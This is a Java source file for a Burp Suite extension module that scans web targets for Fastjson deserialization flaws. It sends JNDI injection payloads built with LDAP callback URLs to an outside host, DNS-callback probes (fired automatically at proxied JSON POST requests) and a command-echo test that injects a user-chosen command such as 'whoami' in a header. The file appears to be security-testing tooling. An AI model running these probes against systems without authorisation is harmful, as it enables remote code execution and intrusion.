package burp.ui;

import burp.*;
import burp.bean.FastjsonBean;
import burp.utils.CustomScanIssue;
import burp.utils.I18nUtils;
import burp.utils.JsonUtils;
import burp.utils.UrlCacheUtil;
import burp.utils.Utils;

import javax.swing.*;
import javax.swing.table.DefaultTableCellRenderer;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import static burp.dao.ConfigDao.getConfig;
import static burp.dao.FastjsonDao.getFastjsonListsByType;

/**
 * @Author Xm17
 * @Date 2024-06-22 12:13
 */
public class FastjsonUI extends AbstractScanUI {
    private JButton btnClear; // 清空按钮
    private JButton btnRefresh; // 刷新按钮
    private volatile boolean autoRefresh = true; // 控制是否自动刷新
    private JCheckBox autoRefreshCheckBox; // 自动刷新开关
    // FastjsonUI 专属表格引用，确保自动刷新始终通知本模块的模型。
    private JTable fastjsonTable;
    private JCheckBox passiveScanCheckBox; // 被动扫描复选框
    private static final List<FastjsonEntry> fastjsonlog = new ArrayList<>(); // fastjson日志

    static List<FastjsonEntry> getFastjsonlog() {
        return fastjsonlog;
    }

    private static volatile FastjsonUI instance;

    static void setCurrentlyDisplayedItem(IHttpRequestResponse item) {
        FastjsonUI ui = instance;
        if (ui != null) ui.currentlyDisplayedItem = item;
    }
    /** 保留字段兼容旧调用方；扫描逻辑使用当前实例字段。 */
    @Deprecated
    public static volatile String dnslog; // dnslog地址
    @Deprecated
    public static volatile String ip; // ip地址
    private volatile String dnslogValue;
    private volatile String ipValue;
    private List<FastjsonBean> jndiPayloads = new ArrayList<>();
    private List<FastjsonBean> versionPayloads = new ArrayList<>();
    private List<FastjsonBean> dnsPayloads = new ArrayList<>();
    private List<FastjsonBean> echoPayloads = new ArrayList<>();
    private final Lock scanLock = new ReentrantLock();

    public static void resetAllCaches() {
        UrlCacheUtil.resetCache("fastjson");
    }

    @Override
    protected void setupScanUI() {
        instance = this;
        // 载入 DB 配置与 payload（编辑器已由基类 createEditors() 创建）
        dnslogValue = safeConfigValue("dnslog");
        ipValue = safeConfigValue("ip");
        dnslog = dnslogValue;
        ip = ipValue;
        jndiPayloads = snapshotPayloads(getFastjsonListsByType("jndi"));
        versionPayloads = snapshotPayloads(getFastjsonListsByType("version"));
        dnsPayloads = snapshotPayloads(getFastjsonListsByType("dns"));
        echoPayloads = snapshotPayloads(getFastjsonListsByType("echo"));

        fastjsonTable = new FastjsonTable(new FastjsonModel(), requestEditor, responseEditor);
        resultTable = fastjsonTable;
        btnClear = new JButton(I18nUtils.get("fastjson.button.clear"));
        btnRefresh = new JButton(I18nUtils.get("fastjson.button.refresh"));
        passiveScanCheckBox = new JCheckBox(I18nUtils.get("fastjson.checkbox.passive_scan"));
        autoRefreshCheckBox = new JCheckBox(I18nUtils.get("fastjson.checkbox.auto_refresh"));
        autoRefreshCheckBox.setSelected(true); // 默认开启自动刷新

        Utils.callbacks.registerHttpListener(this);
    }

    // 加载按钮事件
    @Override
    protected void loadSavedData() {
        // 清空按钮事件
        btnClear.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                synchronized (fastjsonlog) {
                    fastjsonlog.clear();
                }
                UrlCacheUtil.resetCache("fastjson");  // 清空URL缓存
                if (requestEditor != null) requestEditor.setMessage(new byte[0], true);
                if (responseEditor != null) responseEditor.setMessage(new byte[0], false);
                refreshTable();
            }
        });

        // 刷新按钮事件
        btnRefresh.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                refreshTable();
            }
        });

        // 自动刷新开关事件
        autoRefreshCheckBox.addActionListener(e -> {
            setAutoRefreshValue(autoRefreshCheckBox.isSelected());
            if(autoRefreshCheckBox.isSelected()) {
                refreshTable(); // 当开启自动刷新时，立即进行一次刷新
            }
        });
        // 被动扫描复选框事件（联动基类 passiveScanEnabled）
        passiveScanCheckBox.addActionListener(e -> passiveScanEnabled = passiveScanCheckBox.isSelected());
    }

    // 刷新表格方法
    private void refreshTable() {
        refreshTableModel(fastjsonTable);
    }

    // 构建主界面（组件已在 setupScanUI 创建，编辑器由基类 createEditors 创建）
    @Override
    protected void setupCommonUI() {
        panel = new JPanel(new BorderLayout());

        // 顶部面板：清空/刷新/自动刷新/被动扫描
        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 5));
        topPanel.add(btnClear);
        topPanel.add(btnRefresh);
        topPanel.add(autoRefreshCheckBox);
        topPanel.add(passiveScanCheckBox);
        panel.add(topPanel, BorderLayout.NORTH);

        // 第 6 列（payload）自定义渲染器：居中 + 悬停提示
        DefaultTableCellRenderer renderer = new DefaultTableCellRenderer() {
            @Override
            public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
                JLabel label = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
                label.setHorizontalAlignment(JLabel.CENTER);
                label.setHorizontalTextPosition(JLabel.CENTER);
                label.setIconTextGap(0);
                label.setMaximumSize(new Dimension(Integer.MAX_VALUE, label.getPreferredSize().height));
                label.setToolTipText((String) value); // 设置鼠标悬停时显示的提示文本
                return label;
            }
        };
        fastjsonTable.getColumnModel().getColumn(5).setCellRenderer(renderer);

        // 上下分割：结果表 / 请求响应编辑器
        JSplitPane mainsplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        mainsplitPane.setTopComponent(wrapResultsTable(fastjsonTable));
        mainsplitPane.setBottomComponent(buildEditorSplit());
        applyWeights(mainsplitPane, WEIGHT_TABLE_EDITOR);

        panel.add(mainsplitPane, BorderLayout.CENTER);
    }

    @Override
    public String getTabName() {
        return "Fastjson";
    }

    @Override
    protected String getScanName() {
        return "Fastjson";
    }

    @Override
    protected void doPassiveScan(IHttpRequestResponse[] requestResponses, boolean isManual) {
        for (IHttpRequestResponse rr : requestResponses) {
            performPassiveScan(rr);
        }
    }
    // dnslog检测
    public static void CheckDnslog(IHttpRequestResponse[] responses) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.CheckDnslogInternal(responses);
        }
    }

    private void CheckDnslogInternal(IHttpRequestResponse[] responses) {
        if (!hasValidResponse(responses)) {
            return;
        }
        scanLock.lock();
        try{
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            URL dnsurl = analyzeRequest.getUrl();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = new ArrayList<>(Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders());
            String res = I18nUtils.get("fastjson.detection.dnslog");
            IHttpService iHttpService = baseRequestResponse.getHttpService();
            for (FastjsonBean fastjson : snapshotPayloads(dnsPayloads)) {
                String fastjsonDnslog = fastjson.getValue();
                String dnslogPayload = Utils.generateDnsPayload(dnsurl, dnslogValue);
                String fuzzPayload = fastjsonDnslog.replace("FUZZ", dnslogPayload);
                String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
                byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                if (resp == null || resp.getResponse() == null) {
                    Utils.stderr.println("Fastjson scan skipped: target returned no response");
                    continue;
                }
                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                add(extensionMethod, url, statusCode, res, fuzzPayload,resp);
            }
        }finally {
            scanLock.unlock();
        }

    }

    // echo命令检测
    public static void CheckEchoVul(IHttpRequestResponse[] responses) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.CheckEchoVulInternal(responses);
        }
    }

    private void CheckEchoVulInternal(IHttpRequestResponse[] responses) {
        if (!hasValidResponse(responses)) {
            return;
        }
        scanLock.lock();
        try{
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = new ArrayList<>(Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders());
            // 弹出一个输入框，用于获取用户输入的dnslog地址
            String echoVul = showInputDialog(
                    I18nUtils.get("fastjson.message.enter_echo"),
                    I18nUtils.get("config.title.info"),
                    null,
                    "whoami"
            );
            if (echoVul == null || echoVul.trim().isEmpty()) {
                return;
            }
            IHttpService iHttpService = baseRequestResponse.getHttpService();
            Iterator<FastjsonBean> iterator = snapshotPayloads(echoPayloads).iterator();
            headers.add("Accept-Cache: " + echoVul);
            while (iterator.hasNext()) {
                FastjsonBean fastjson = iterator.next();
                String fastjsonEcho = fastjson.getValue();
                byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonEcho);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                if (resp == null || resp.getResponse() == null) {
                    Utils.stderr.println("Fastjson scan skipped: target returned no response");
                    continue;
                }
                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                List<String> headersResp = iResponseInfo.getHeaders();
                boolean containsContentAuth = false;
                for (String header : headersResp) {
                    if (header != null && header.toLowerCase().startsWith("content-auth:")) {
                        containsContentAuth = true;
                        break;
                    }
                }
                if (containsContentAuth) {
                    add(extensionMethod, url, statusCode, I18nUtils.get("fastjson.detection.echo_found"), fastjsonEcho, resp);
                    IScanIssue issues = null;
                    try {
                        issues = new CustomScanIssue(iHttpService, new URL(url), new IHttpRequestResponse[]{resp},
                                "Fastjson echo", I18nUtils.get("fastjson.issue.echo"),
                                "High", "Certain");
                        Utils.callbacks.addScanIssue(issues);
                    } catch (MalformedURLException e) {
                        throw new RuntimeException(e);
                    }
                } else {
                    add(extensionMethod, url, statusCode, I18nUtils.get("fastjson.detection.echo_not_found"), fastjsonEcho, resp);
                }
            }
        }finally {
            scanLock.unlock();
        }
    }
    // jndi检测
    public static void CheckJNDIVul(IHttpRequestResponse[] responses) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.CheckJNDIVulInternal(responses);
        }
    }

    private void CheckJNDIVulInternal(IHttpRequestResponse[] responses) {
        if (!hasValidResponse(responses)) {
            return;
        }
        scanLock.lock();
        try {
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = new ArrayList<>(Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders());
            try {

                String[] options = {"DNS", "IP"};
                String selectedValue = showInputDialog(
                        I18nUtils.get("fastjson.dialog.select_type"),
                        I18nUtils.get("fastjson.dialog.tip"),
                        options,
                        "IP"
                );
                if (selectedValue == null) {
                    return;
                }
                String jndiStr = Objects.equals(selectedValue, "DNS") ? dnslogValue : ipValue;

                IHttpService iHttpService = baseRequestResponse.getHttpService();
                for (FastjsonBean payload : snapshotPayloads(jndiPayloads)) {
                    String dnslogKey = "";

                    String fastjsonJNDI = payload.getValue();
                    String id = String.valueOf(payload.getId());
                    if (selectedValue.equals("DNS")) {
                        dnslogKey = "ldap://" + id + "." + jndiStr;
                    } else {
                        dnslogKey = "ldap://" + jndiStr + "/" + id;
                    }
                    String fuzzPayload = fastjsonJNDI.replace("FUZZ", dnslogKey);
                    String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
                    byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
                    byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
                    IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                    if (resp == null || resp.getResponse() == null) {
                        Utils.stderr.println("Fastjson scan skipped: target returned no response");
                        continue;
                    }
                    IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                    String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                    add(extensionMethod, url, statusCode, I18nUtils.get("fastjson.detection.jndi"), fuzzPayload, resp);
                }
            } catch (Exception e) {
                Utils.stderr.println(e.getMessage());
            }
        }finally {
            scanLock.unlock();
        }
    }
    // version检测
    public static void CheckVersion(IHttpRequestResponse[] responses) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.CheckVersionInternal(responses);
        }
    }

    private void CheckVersionInternal(IHttpRequestResponse[] responses) {
        if (!hasValidResponse(responses)) {
            return;
        }
        scanLock.lock();
        try{
            IHttpRequestResponse baseRequestResponse = responses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String extensionMethod = analyzeRequest.getMethod();
            String url = analyzeRequest.getUrl().toString();
            List<String> headers = new ArrayList<>(Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders());
            IHttpService iHttpService = baseRequestResponse.getHttpService();
            for (FastjsonBean fastjson : snapshotPayloads(versionPayloads)) {
                String fastjsonVersion = fastjson.getValue();
                byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonVersion);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                if (resp == null || resp.getResponse() == null) {
                    Utils.stderr.println("Fastjson scan skipped: target returned no response");
                    continue;
                }
                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                add(extensionMethod, url, statusCode, I18nUtils.get("fastjson.detection.version"), fastjsonVersion, resp);
            }
        }finally {
            scanLock.unlock();
        }
    }
    // 添加日志
    private void add(String extensionMethod, String url, String status, String res,String req, IHttpRequestResponse baseRequestResponse) {
        synchronized (fastjsonlog) {
            int id = fastjsonlog.size();
            fastjsonlog.add(new FastjsonEntry(id, extensionMethod, url, status, res,req, baseRequestResponse));
            // 只保留refreshTable即可，删除updateUI
            if(autoRefresh) {
                refreshTable();
            }
        }
    }
    public static void setAutoRefresh(boolean value) {
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.setAutoRefreshValue(value);
        }
    }

    private void setAutoRefreshValue(boolean value) {
        autoRefresh = value;
    }

    public static void setDnslog(String value) {
        value = value == null ? "" : value;
        dnslog = value;
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.dnslogValue = value;
        }
    }

    public static void setIp(String value) {
        value = value == null ? "" : value;
        ip = value;
        FastjsonUI ui = instance;
        if (ui != null) {
            ui.ipValue = value;
        }
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        // 只处理被动扫描启用、响应包、且来自代理或Spider的请求
        if (!passiveScanEnabled || messageIsRequest ||
                (toolFlag != IBurpExtenderCallbacks.TOOL_PROXY &&
                        toolFlag != IBurpExtenderCallbacks.TOOL_SPIDER)) {
            return;
        }

        IRequestInfo requestInfo = Utils.helpers.analyzeRequest(messageInfo);
        URL infoUrl = requestInfo.getUrl();
        String url = requestInfo.getUrl().toString();
        String method = requestInfo.getMethod();
        List<String> headers = requestInfo.getHeaders();

        // 检查是否为静态资源
        if (Utils.isUrlBlackListSuffix(url)) {
            return;
        }

        // 检查是否重复
        if (!UrlCacheUtil.checkUrlUnique("fastjson", method, infoUrl, new ArrayList<>())) {
            return;
        }

        // 检查是否为POST请求且Content-Type为JSON
        if (!"POST".equalsIgnoreCase(method)) {
            return;
        }

        boolean isJson = false;
        for (String header : headers) {
            if (header.toLowerCase().contains("content-type") &&
                    header.toLowerCase().contains("application/json")) {
                isJson = true;
                break;
            }
        }

        if (!isJson) {
            return;
        }

        // 网络探测放入统一有界线程池，避免阻塞 Burp HTTP Listener。
        startPassiveScan(new IHttpRequestResponse[]{messageInfo}, false);
    }

    // 执行被动扫描测试
    private void performPassiveScan(IHttpRequestResponse baseRequestResponse) {
        try {
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String url = analyzeRequest.getUrl().toString();
            String method = analyzeRequest.getMethod();
            List<String> headers = new ArrayList<>(analyzeRequest.getHeaders());
            IHttpService httpService = baseRequestResponse.getHttpService();
            URL dnsurl = analyzeRequest.getUrl();
            // 使用dnslog payload进行测试
            for (FastjsonBean fastjson : snapshotPayloads(dnsPayloads)) {
                String fastjsonDnslog = fastjson.getValue();
                String dnslogPayload = Utils.generateDnsPayload(dnsurl, dnslogValue);
                String fuzzPayload = fastjsonDnslog.replace("FUZZ", dnslogPayload);
                String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
                byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload);

                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(httpService, postMessage);
                if (resp == null || resp.getResponse() == null) {
                    Utils.stderr.println("Fastjson passive scan skipped: target returned no response");
                    continue;
                }
                IResponseInfo responseInfo = Utils.helpers.analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(responseInfo.getStatusCode());

                // 记录扫描结果
                add(method, url, statusCode, I18nUtils.get("fastjson.detection.passive_dns"), fuzzPayload, resp);
            }
        } catch (Exception e) {
            Utils.stderr.println("Passive scan error: " + e.getMessage());
        }
    }


    private static String showInputDialog(String message, String title, Object[] options, Object initialValue) {
        final String[] result = new String[1];
        Runnable dialog = () -> result[0] = (String) JOptionPane.showInputDialog(
                null, message, title, JOptionPane.PLAIN_MESSAGE, null, options, initialValue);
        if (SwingUtilities.isEventDispatchThread()) {
            dialog.run();
            return result[0];
        }
        try {
            SwingUtilities.invokeAndWait(dialog);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            Utils.stderr.println("Fastjson dialog interrupted");
        } catch (java.lang.reflect.InvocationTargetException e) {
            Utils.stderr.println("Fastjson dialog failed: " + e.getCause());
        }
        return result[0];
    }

    private static boolean hasValidResponse(IHttpRequestResponse[] responses) {
        return responses != null && responses.length > 0 && responses[0] != null
                && Utils.helpers != null && Utils.callbacks != null;
    }

    private String safeConfigValue(String key) {
        try {
            burp.bean.ConfigBean config = getConfig("config", key);
            return config == null || config.getValue() == null ? "" : config.getValue();
        } catch (Exception e) {
            Utils.stderr.println("Fastjson config load failed for " + key + ": " + e.getMessage());
            return "";
        }
    }

    private static List<FastjsonBean> snapshotPayloads(List<FastjsonBean> payloads) {
        List<FastjsonBean> snapshot = new ArrayList<>();
        if (payloads == null) {
            return snapshot;
        }
        for (FastjsonBean payload : payloads) {
            if (payload != null && payload.getValue() != null && !payload.getValue().trim().isEmpty()) {
                snapshot.add(payload);
            }
        }
        return snapshot;
    }

}
